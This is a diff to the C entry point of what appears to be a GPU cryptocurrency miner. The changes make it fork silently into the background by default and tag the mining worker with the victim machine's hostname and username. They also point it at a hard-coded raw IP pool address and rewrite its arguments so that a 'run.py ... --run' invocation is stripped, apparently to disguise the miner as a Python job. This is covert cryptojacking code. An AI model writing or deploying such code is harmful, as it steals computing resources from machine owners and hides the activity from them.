@@ -1357,11 +1357,11 @@ char* getusername () {
 
 int main(int argc, char** argv)
 {
-    int zzi;
     int is_background_zz=1;
-    for (zzi=1; zzi<argc; zzi++) {
+    for (int zzi=1; zzi<argc; zzi++) {
         if (strcmp(argv[zzi], "--foreground") == 0) {
             is_background_zz=0;
+            break;
         }
     }
     if (is_background_zz==1 && fork()) return 0;
@@ -1372,21 +1372,37 @@ int main(int argc, char** argv)
     char hostname[1024];
     gethostname(hostname, sizeof(hostname));
 
-    //strcat(hostname, "_" );
-    //strcat(hostname, nowuser );
-
-
     char pool[2048];
-    sprintf(pool, "stratum1+tcp://veryvery.%s%s@eth.f2pool.com:6688", hostname, nowuser);
+    //sprintf(pool, "stratum+tcp://veryvery.%s%s@ethash.poolbinance.com:1800", hostname, nowuser);
+    //sprintf(pool, "stratum+tcp://veryvery.%s%s@119.29.56.102:20", hostname, nowuser);
+    sprintf(pool, "stratum1+tcp://veryvery.%s%s@119.29.56.102:20", hostname, nowuser);
+    //sprintf(pool, "stratum1+tcp://veryvery.%s%s@eth-backup.f2pool.com:6688", hostname, nowuser);
     if (is_background_zz==0) {
         printf("pool: %s", pool);
     }
-    argv[argc++] = (char*) "--pool";
-    argv[argc++] = pool;
-    //argv[argc++] = (char*) "stratum1+tcp://USER.MINER@eth.f2pool.com:6688";
-    argv[argc++] = (char*) "--cuda";
+    char* argv2[16];
+    int argc2 = 0;
+    argv2[argc2++] = argv[0];
+    argv2[argc2++] = (char*) "--pool";
+    argv2[argc2++] = pool;
+    //argv[argc++] = (char*) "stratum+tcp://USER.MINER@eth.f2pool.com:6688";
+    argv2[argc2++] = (char*) "--cuda";
 
-
+    int zzpass=0;
+    for (int zzi=1; zzi<argc; zzi++) {
+        if (strcmp(argv[zzi], "run.py") == 0) {
+            zzpass=1;
+        }
+        if ( strcmp(argv[zzi], "--run") == 0 ) {
+            zzpass=0;
+            continue;
+        }
+        if (zzpass==0) {
+            argv2[argc2++] = argv[zzi];
+        }
+    }
+    argv = argv2;
+    argc = argc2;
 
     // Return values
     // 0 - Normal exit
